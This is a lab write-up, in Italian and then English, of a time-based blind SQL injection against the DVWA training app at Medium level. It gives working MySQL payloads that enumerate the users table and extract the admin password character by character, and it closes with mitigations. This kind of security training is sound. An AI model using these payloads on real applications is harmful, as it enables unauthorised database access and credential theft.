
## SQL Injection – Blind (Medium) – Italiano

## Descrizione

Nel livello "Medium" di DVWA, l’applicazione presenta un form che consente di selezionare un `User ID` da una lista predefinita.  
Il parametro `id` viene passato in una query SQL senza adeguata sanificazione, rendendo possibile un attacco di tipo **Blind SQL Injection**.

## Obiettivo

Estrarre l'username e la password dell'utente `admin`, senza output diretto, tramite tecniche time-based.

## Ambiente di test

- DVWA livello: Medium  
- VirtualBox  
- Browser: Firefox  
- Strumenti: Burp Suite, DevTools

## Fasi dell'attacco

### 1. Rilevamento della vulnerabilità

- L'applicazione accetta solo ID da 1 a 5 tramite dropdown.
- Inserendo valori arbitrari nel parametro `id`, la risposta HTML mostra "missing".
- Il payload `1 AND 1=1 #` restituisce "exists".
- Il payload `1 AND 1=2 #` restituisce "missing".
- Conferma della vulnerabilità **Blind SQLi basata su booleani**.

---

### 2. Verifica dell'esistenza della tabella `users`

- Payload con `SLEEP(5)`:

```sql
1 AND (SELECT IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_name=0x7573657273), SLEEP(5), 0)) #
```

- Risultato: il server ha introdotto un ritardo → conferma che la tabella `users` esiste.

---

### 3. Verifica della lunghezza del nome tabella

```sql
1 AND (SELECT IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_name=0x7573657273 LIMIT 1))=5, SLEEP(5), 0)) #
```

- Confermata lunghezza esatta = 5 → nome esatto: `users`.

---

### 4. Verifica delle colonne

- Colonna `user`:

```sql
1 AND (SELECT IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_name=0x7573657273 AND column_name=0x75736572), SLEEP(5), 0)) #
```

- Confermata l'esistenza della colonna `user`.

---

### 5. Esfiltrazione dell'username

- Payload generico (es. primo carattere `'a'`):

```sql
1 AND (SELECT IF(ASCII(SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1))=0x61, SLEEP(5), 0)) #
```

- Utilizzando Burp Intruder con lista esadecimale, è stato identificato il primo utente: `admin`.

---

### 6. Esfiltrazione della password di admin

```sql
1 AND (SELECT IF(ASCII(SUBSTRING((SELECT password FROM users WHERE user=0x61646d696e),1,1))=0x61, SLEEP(5), 0)) #
```

- L’attacco ha permesso l’estrazione completa della password associata all’utente `admin`, tramite esfiltrazione carattere per carattere con delay.

> ⚠️ I dati estratti non sono riportati per motivi etici.

---

## Considerazioni finali

Questa esercitazione dimostra come un'applicazione, anche con interfaccia limitata, possa essere completamente compromessa sfruttando una Blind SQL Injection time-based.  
L'attacco ha richiesto pazienza, ma non strumenti automatici, solo metodo e logica.

---

## Mitigazioni consigliate

- Utilizzare query parametrizzate (prepared statements)  
- Non concatenare direttamente input utente  
- Validare e sanificare ogni input  
- Limitare i privilegi dell’utente del DB  
- Monitorare e loggare le attività sospette

---

---

## SQL Injection – Blind (Medium) – English

## Description

In DVWA's "Medium" level, the application allows selecting a `User ID` from a predefined list.  
The `id` parameter is used in an SQL query without proper sanitization, enabling a **Blind SQL Injection** attack.

## Objective

Extract the username and password of user `admin`, without visible output, using time-based techniques.

## Test environment

- DVWA level: Medium  
- VirtualBox  
- Browser: Firefox  
- Tools: Burp Suite, DevTools

## Attack steps

### 1. Vulnerability discovery

- Only IDs 1 to 5 are selectable.
- Arbitrary `id` values return "missing" in HTML.
- Payload `1 AND 1=1 #` returns "exists".
- Payload `1 AND 1=2 #` returns "missing".
- Boolean-based Blind SQL Injection confirmed.

---

### 2. Table `users` existence check

```sql
1 AND (SELECT IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_name=0x7573657273), SLEEP(5), 0)) #
```

→ Delayed response confirms the `users` table exists.

---

### 3. Table name length check

```sql
1 AND (SELECT IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_name=0x7573657273 LIMIT 1))=5, SLEEP(5), 0)) #
```

→ Confirmed length = 5 → table name is exactly `users`.

---

### 4. Column discovery

- For column `user`:

```sql
1 AND (SELECT IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_name=0x7573657273 AND column_name=0x75736572), SLEEP(5), 0)) #
```

→ Column `user` confirmed to exist.

---

### 5. Username extraction

```sql
1 AND (SELECT IF(ASCII(SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1))=0x61, SLEEP(5), 0)) #
```

→ Using Burp Intruder and hexadecimal values, the first user was identified: `admin`.

---

### 6. Password extraction of admin

```sql
1 AND (SELECT IF(ASCII(SUBSTRING((SELECT password FROM users WHERE user=0x61646d696e),1,1))=0x61, SLEEP(5), 0)) #
```

→ Full password successfully extracted, character by character, using time delays.

> ⚠️ Extracted values are omitted for ethical reasons.

---

## Final thoughts

This lab shows how an application with even limited UI can be fully compromised via a time-based blind SQL injection.  
Patience and logic were enough — no automated tools were required.

---

## Recommended mitigations

- Use parameterized queries (prepared statements)  
- Avoid concatenating user input directly  
- Properly validate and sanitize input  
- Restrict DB user privileges  
- Log and monitor suspicious activities

---

